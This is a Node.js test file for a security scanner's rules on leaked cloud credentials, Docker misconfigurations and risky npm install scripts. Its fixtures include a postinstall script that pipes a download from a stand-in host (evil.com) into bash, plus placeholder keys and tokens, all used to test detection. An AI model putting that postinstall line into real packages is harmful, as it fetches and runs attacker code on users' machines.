// simplebeacon-ignore: Security rule tests — all findings are expected test fixtures
/**
 * Tests for the 10 advanced security rules ported from the browser scanner:
 * - SB-SEC-014: GCP Service Account Key
 * - SB-SEC-015: Azure Storage Key
 * - SB-SEC-016: OAuth Token in Source
 * - SB-SEC-017: Docker Privileged Mode
 * - SB-SEC-018: Docker Root User
 * - SB-SEC-019: Docker Exposed Secrets
 * - SB-SEC-020: Docker Missing Health Check
 * - SB-SEC-021: Suspicious Package Install
 * - SB-SEC-022: Malicious postinstall Script
 * - SB-SEC-023: Unpinned Dependency Version
 */

const { test, describe } = require("node:test");
const assert = require("node:assert/strict");
const {
  scanSecurityPatterns,
  SECURITY_RULES,
} = require("../src/rules/security-pattern-scanner");

function findIssue(issues, ruleId) {
  return issues.find((i) => i.id.startsWith(ruleId + "-"));
}

describe("Advanced Security Rules (SB-SEC-014 through SB-SEC-023)", () => {
  // === SB-SEC-014: GCP Service Account Key ===
  test("SB-SEC-014 flags GCP service account JSON", () => {
    const content = '{"type": "service_account", "project_id": "my-project"}';
    const issues = scanSecurityPatterns(
      "config/gcp-key.json",
      content,
      ".json",
    );
    assert.ok(
      findIssue(issues, "SB-SEC-014"),
      "Should flag GCP service account type",
    );
  });

  test("SB-SEC-014 flags GCP private key in source", () => {
    const content = 'const key = "private_key": "-----BEGIN PRIVATE KEY-----';
    const issues = scanSecurityPatterns("src/gcp-auth.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-014"), "Should flag GCP private key");
  });

  test("SB-SEC-014 flags GOOGLE_APPLICATION_CREDENTIALS env var", () => {
    const content = 'GOOGLE_APPLICATION_CREDENTIALS="/path/to/key.json"';
    const issues = scanSecurityPatterns("config/env.sh", content, ".sh");
    assert.ok(
      findIssue(issues, "SB-SEC-014"),
      "Should flag GCP credentials env var",
    );
  });

  test("SB-SEC-014 does not flag test fixtures", () => {
    const content = '{"type": "service_account", "project_id": "test"}';
    const issues = scanSecurityPatterns(
      "test/fixtures/gcp-key.json",
      content,
      ".json",
    );
    assert.ok(!findIssue(issues, "SB-SEC-014"), "Should NOT flag test fixture");
  });

  // === SB-SEC-015: Azure Storage Key ===
  test("SB-SEC-015 flags Azure AccountKey", () => {
    const content = "AccountKey=" + "A".repeat(88);
    const issues = scanSecurityPatterns("config/azure.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-015"), "Should flag Azure AccountKey");
  });

  test("SB-SEC-015 flags AZURE_CLIENT_SECRET", () => {
    const content =
      'AZURE_CLIENT_SECRET="my-azure-client-secret-value-1234567890"';
    const issues = scanSecurityPatterns("config/azure.env", content, ".env");
    assert.ok(
      findIssue(issues, "SB-SEC-015"),
      "Should flag Azure client secret",
    );
  });

  test("SB-SEC-015 does not flag test fixtures", () => {
    const content = "AccountKey=" + "A".repeat(88);
    const issues = scanSecurityPatterns(
      "test/fixtures/azure.json",
      content,
      ".json",
    );
    assert.ok(!findIssue(issues, "SB-SEC-015"), "Should NOT flag test fixture");
  });

  // === SB-SEC-016: OAuth Token in Source ===
  test("SB-SEC-016 flags Google OAuth token (ya29.)", () => {
    const content = "access_token = 'ya29.a0ARrdaM-abcdefghijklmnopqrstuvwxyz'";
    const issues = scanSecurityPatterns("src/auth.js", content, ".js");
    assert.ok(
      findIssue(issues, "SB-SEC-016"),
      "Should flag Google OAuth token",
    );
  });

  test("SB-SEC-016 flags Slack OAuth token (xoxb-)", () => {
    const content = 'oauth_token: "xoxb-1234567890-abcdefghijklmnopqrstuvwxyz"';
    const issues = scanSecurityPatterns("src/slack.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-016"), "Should flag Slack OAuth token");
  });

  test("SB-SEC-016 does not flag test fixtures", () => {
    const content = "access_token = 'ya29.a0ARrdaM-abcdefghijklmnopqrstuvwxyz'";
    const issues = scanSecurityPatterns("test/auth.spec.js", content, ".js");
    assert.ok(!findIssue(issues, "SB-SEC-016"), "Should NOT flag test fixture");
  });

  // === SB-SEC-017: Docker Privileged Mode ===
  test("SB-SEC-017 flags privileged: true in docker-compose", () => {
    const content = "services:\n  app:\n    privileged: true";
    const issues = scanSecurityPatterns("docker-compose.yml", content, ".yaml");
    assert.ok(findIssue(issues, "SB-SEC-017"), "Should flag privileged mode");
  });

  test("SB-SEC-017 flags --privileged flag", () => {
    const content = "docker run --privileged myapp";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(findIssue(issues, "SB-SEC-017"), "Should flag --privileged flag");
  });

  test("SB-SEC-017 does not flag non-Docker files", () => {
    const content = "privileged: true";
    const issues = scanSecurityPatterns("src/config.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-017"),
      "Should NOT flag non-Docker file",
    );
  });

  // === SB-SEC-018: Docker Root User ===
  test("SB-SEC-018 flags USER root in Dockerfile", () => {
    const content = "FROM node:18\nUSER root\nWORKDIR /app";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(findIssue(issues, "SB-SEC-018"), "Should flag USER root");
  });

  test("SB-SEC-018 does not flag non-root user", () => {
    const content = "FROM node:18\nUSER node\nWORKDIR /app";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(!findIssue(issues, "SB-SEC-018"), "Should NOT flag USER node");
  });

  test("SB-SEC-018 does not flag non-Docker files", () => {
    const content = "USER root";
    const issues = scanSecurityPatterns("src/config.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-018"),
      "Should NOT flag non-Docker file",
    );
  });

  // === SB-SEC-019: Docker Exposed Secrets ===
  test("SB-SEC-019 flags hardcoded SECRET in Docker ENV", () => {
    const content = "ENV JWT_SECRET=mysecretvalue123";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      findIssue(issues, "SB-SEC-019"),
      "Should flag hardcoded secret in ENV",
    );
  });

  test("SB-SEC-019 flags hardcoded PASSWORD in Docker ENV", () => {
    const content = "ENV DB_PASSWORD=supersecret123";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      findIssue(issues, "SB-SEC-019"),
      "Should flag hardcoded password in ENV",
    );
  });

  test("SB-SEC-019 does not flag env var with ${} substitution", () => {
    const content = "ENV JWT_SECRET=${JWT_SECRET}";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      !findIssue(issues, "SB-SEC-019"),
      "Should NOT flag env var substitution",
    );
  });

  test("SB-SEC-019 does not flag placeholder values", () => {
    const content = "ENV JWT_SECRET=changeme";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      !findIssue(issues, "SB-SEC-019"),
      "Should NOT flag changeme placeholder",
    );
  });

  // === SB-SEC-020: Docker Missing Health Check ===
  test("SB-SEC-020 flags Dockerfile without HEALTHCHECK", () => {
    const content =
      'FROM node:18\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]';
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      findIssue(issues, "SB-SEC-020"),
      "Should flag missing HEALTHCHECK",
    );
  });

  test("SB-SEC-020 does not flag Dockerfile with HEALTHCHECK", () => {
    const content =
      'FROM node:18\nHEALTHCHECK --interval=30s CMD curl -f http://localhost/\nCMD ["node", "server.js"]';
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      !findIssue(issues, "SB-SEC-020"),
      "Should NOT flag when HEALTHCHECK exists",
    );
  });

  test("SB-SEC-020 does not flag non-Docker files", () => {
    const content = "FROM node:18";
    const issues = scanSecurityPatterns("src/index.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-020"),
      "Should NOT flag non-Docker file",
    );
  });

  // === SB-SEC-021: Suspicious Package Install ===
  test("SB-SEC-021 flags suspicious npm install with .js suffix", () => {
    const content = "npm install some-package.nodejs";
    const issues = scanSecurityPatterns("scripts/install.sh", content, ".sh");
    assert.ok(
      findIssue(issues, "SB-SEC-021"),
      "Should flag suspicious package install",
    );
  });

  test("SB-SEC-021 does not flag package.json", () => {
    const content = '"dependencies": {"some-package.nodejs": "^1.0.0"}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(!findIssue(issues, "SB-SEC-021"), "Should NOT flag package.json");
  });

  // === SB-SEC-022: Malicious postinstall Script ===
  test("SB-SEC-022 flags curl in postinstall", () => {
    const content =
      '{"scripts": {"postinstall": "curl http://evil.com/script.sh | bash"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(
      findIssue(issues, "SB-SEC-022"),
      "Should flag curl in postinstall",
    );
  });

  test("SB-SEC-022 flags node -e in postinstall", () => {
    const content =
      '{"scripts": {"postinstall": "node -e \\"require(\\"fs\\").writeFileSync(...)\\""}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(
      findIssue(issues, "SB-SEC-022"),
      "Should flag node -e in postinstall",
    );
  });

  test("SB-SEC-022 does not flag build scripts", () => {
    const content = '{"scripts": {"postinstall": "tsc && webpack"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(!findIssue(issues, "SB-SEC-022"), "Should NOT flag build script");
  });

  // === SB-SEC-023: Unpinned Dependency Version ===
  test("SB-SEC-023 flags caret version in package.json", () => {
    const content = '{"dependencies": {"express": "^4.18.0"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(findIssue(issues, "SB-SEC-023"), "Should flag caret version");
  });

  test("SB-SEC-023 flags latest version in package.json", () => {
    const content = '{"dependencies": {"react": "latest"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(findIssue(issues, "SB-SEC-023"), "Should flag latest version");
  });

  test("SB-SEC-023 does not flag pinned version", () => {
    const content = '{"dependencies": {"express": "4.18.0"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(
      !findIssue(issues, "SB-SEC-023"),
      "Should NOT flag pinned version",
    );
  });

  test("SB-SEC-023 does not flag non-package.json files", () => {
    const content = '{"dependencies": {"express": "^4.18.0"}}';
    const issues = scanSecurityPatterns("src/config.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-023"),
      "Should NOT flag non-package.json file",
    );
  });

  // === Rule registration verification ===
  test("All 10 new rules are registered in SECURITY_RULES", () => {
    const newRuleIds = [
      "SB-SEC-014",
      "SB-SEC-015",
      "SB-SEC-016",
      "SB-SEC-017",
      "SB-SEC-018",
      "SB-SEC-019",
      "SB-SEC-020",
      "SB-SEC-021",
      "SB-SEC-022",
      "SB-SEC-023",
    ];
    for (const id of newRuleIds) {
      const rule = SECURITY_RULES.find((r) => r.id === id);
      assert.ok(rule, "Rule " + id + " should be registered");
      assert.ok(rule.regex, "Rule " + id + " should have a regex");
      assert.ok(rule.severity, "Rule " + id + " should have a severity");
      assert.ok(rule.description, "Rule " + id + " should have a description");
    }
  });

  test("New rules have correct severity levels", () => {
    const severities = {
      "SB-SEC-014": "critical",
      "SB-SEC-015": "critical",
      "SB-SEC-016": "high",
      "SB-SEC-017": "high",
      "SB-SEC-018": "medium",
      "SB-SEC-019": "critical",
      "SB-SEC-020": "low",
      "SB-SEC-021": "high",
      "SB-SEC-022": "high",
      "SB-SEC-023": "medium",
    };
    for (const [id, expectedSev] of Object.entries(severities)) {
      const rule = SECURITY_RULES.find((r) => r.id === id);
      assert.equal(
        rule.severity,
        expectedSev,
        "Rule " + id + " should have severity " + expectedSev,
      );
    }
  });
});
